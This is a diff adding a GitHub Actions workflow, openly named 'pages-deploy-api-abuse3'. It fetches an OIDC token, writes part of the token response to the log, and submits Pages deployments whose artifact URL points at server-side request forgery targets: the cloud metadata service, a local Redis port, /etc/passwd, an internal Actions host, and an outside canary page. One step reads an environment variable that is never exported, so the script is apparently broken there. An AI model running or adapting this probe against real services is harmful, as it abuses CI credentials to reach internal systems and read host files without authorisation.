@@ -1,0 +1,55 @@
+name: pages-deploy-api-abuse3
+on:
+  workflow_dispatch:
+    inputs:
+      mode:
+        description: 'mode'
+        required: true
+        default: 'artifact_url'
+        type: string
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    environment: github-pages
+    steps:
+      - name: get oidc
+        id: tok
+        run: |
+          echo "request_url=${ACTIONS_ID_TOKEN_REQUEST_URL:-UNSET}" >> "$GITHUB_OUTPUT"
+          echo "aud var=${ACTIONS_ID_TOKEN_REQUEST_URL:+set}" >> "$GITHUB_OUTPUT"
+          T=$(curl -s -H "Authorization: bearer ${{ secrets.GITHUB_TOKEN }}" \
+               "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=github.com/madamara" || true)
+          echo "$T" | head -c 200
+          echo
+          V=$(echo "$T" | python3 -c "import sys,json
+          try:
+            print(json.load(sys.stdin).get('value',''))
+          except Exception as e:
+            print('')")
+          echo "token_len=${#V}"
+          echo "token=$V" >> "$GITHUB_OUTPUT"
+      - name: call API
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          OIDC: ${{ steps.tok.outputs.token }}
+          MODE: ${{ inputs.mode }}
+          REPO: ${{ github.repository }}
+        run: |
+          if [ -z "$OIDC" ]; then echo "NO OIDC TOKEN - abort"; exit 1; fi
+          case "$MODE" in
+            artifact_url) URL="https://madaraninja1337.github.io/canary/1791280213.html" ;;
+            metadata)     URL="http://169.254.169.254/latest/meta-data/" ;;
+            localhost)    URL="http://127.0.0.1:6379/INFO" ;;
+            file)         URL="file:///etc/passwd" ;;
+            azblob)       URL="https://results-receiver.actions.githubusercontent.com/" ;;
+          esac
+          python3 -c "
+          import json,os
+          body={'pages_build_version':'pwn','artifact_url':os.environ['URL'],'oidc_token':os.environ['OIDC']}
+          open('/tmp/p.json','w').write(json.dumps(body))"
+          URL_SAFE="$URL" MODE_SAFE="$MODE" python3 -c "import os; print('URL=', os.environ['URL_SAFE'], 'MODE=', os.environ['MODE_SAFE'])"
+          gh api -X POST /repos/$REPO/pages/deployments --input /tmp/p.json 2>&1 | head -20
